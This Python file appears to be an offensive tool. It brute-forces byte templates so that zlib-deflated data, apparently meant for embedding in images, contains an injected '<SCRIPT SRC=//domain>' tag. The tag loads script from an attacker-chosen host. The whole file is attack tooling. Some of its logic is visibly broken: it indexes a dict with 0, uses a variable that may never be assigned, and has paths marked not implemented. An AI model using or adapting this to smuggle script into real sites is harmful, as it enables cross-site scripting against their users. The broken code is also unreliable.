from multiprocessing.dummy import Pool
from binascii import unhexlify
from zlib import compress
import re

domain_template_table = {
    "BZ": ["f399281922111510691928276e6e{}1e581b1f576e69b16375535b6f0e7f", 0x111111, 0xffffff],  # Credit to Adam Logue
    "PE": ["7ff399281922111510691928276e6e{}1e51241f576e69b16375535b6f", 0x111111, 0xffffff],  # Credit to fin1te
    "CZ": ["f399281922111510691928276e6e{}1e681b1f576e69b16375535b6f", 0x111111, 0xffffff],  # Credit to Vavkamil
    "threeXthree": ["f399281922111510691928276e6e{}1e51241f576e69b16375535b6f", 0x111111, 0xffffff],  # PE tld crutch
    "fourXtwo": ["f399281922111510691928276e6e{}1e51231f576e69b16375535b6f", 0x11111111, 0xffffffff]  # PE tld crutch
}

tld_template_table = {
    "threeXthree": ["7ff399281922111510691928276e6e5111111e{}576e69b16375535b6f", 0x111111, 0xffffff],  # PPP domain crutch
    "fourXtwo": ["7ff399281922111510691928276e6e511111111e{}576e69b16375535b6f", 0x1111, 0xffff]  # PPPP domain crutch
}

def domain_parse(domain):
    prefix = ".".join(domain.split(".")[:-1])
    tld = "".join(domain.split(".")[-1:])
    return prefix, tld

def gzdeflate(string):
    deflated = compress(string)[2:-4]
    return deflated

class Attack():
    def __init__(self, template, start, end, payload=""):
        self.template = template
        self.start = start
        self.end = end
        self.payload = payload
        self.range = int(end.bit_length() / 4)
        self.pool = Pool(5)

    def hex(self, num):
        num = f"{num:x}"
        return str(num).zfill(self.range)

    def f(self, l):
        t = self.template.format(self.hex(l))
        x = gzdeflate(unhexlify(t))
        return (x, t)

    def attack(self):
        for result in self.pool.imap_unordered(self.f, range(self.start, self.end + 1)):
            if self.payload.encode() in result[0]:
                print("{},{}".format(self.payload, result[1]))
                return result[1]


def domain_brute(target, prefix, tld):
    target = "//{}".format(target)
    print("[+] Payload:")
    print("[-] Target Payload:", target)

    # Determine attack template
    complex = 0
    if len(prefix) > 3:
        print("[+] Domains > 3 -- Not implemented yet!")
        return
    if tld.upper() in domain_template_table.keys():
        print("[+] Known tld found, using fast attack!")
        template = domain_template_table[tld][0]
        start = domain_template_table[tld][1]
        end = domain_template_table[tld][2]
        payload = Attack(template, start, end, payload=target).attack()
        return payload
    elif (len(tld) is 3) and (len(prefix) is 3):
        print("[+] Using threeXthree attack...")
        print("[+] Attempting to bruteforce tld first")
        # attack tld first using PPP domain as a crutch
        target = "<SCRIPT SRC=//PPP.%s></SCRIPT" % tld
        template = tld_template_table["threeXthree"][0]
        start = tld_template_table["threeXthree"][1]
        end = tld_template_table["threeXthree"][2]
        tld_cracked = Attack(template, start, end, payload=target).attack()

        # if succesfful, build domain template using discovered tld as crutch
        if tld_cracked:
            print("[!] COMPLETE: tld found -- attacking domain next")
            regex = '6e6e511111111e(.*)576e69b163'
            m = re.search(regex, tld_cracked)
            if m:
                construct = tld_template_table[0] % m.group(1)
                template = construct.replace("511111", "%s")
                print("[-] Domain Attack Template: %s" % template)

        # attack domain using discovered tld as crutch
        target = "<SCRIPT SRC=//%s.%s></SCRIPT" % (prefix, construct)
        start = domain_template_table["threeXthree"][1]
        end = domain_template_table["threeXthree"][2]
        payload = Attack(template, start, end, payload=target).attack()

        if payload:
            return payload
        else:
            return
    else:
        print("Attack for this domain not implement yet")
        return False
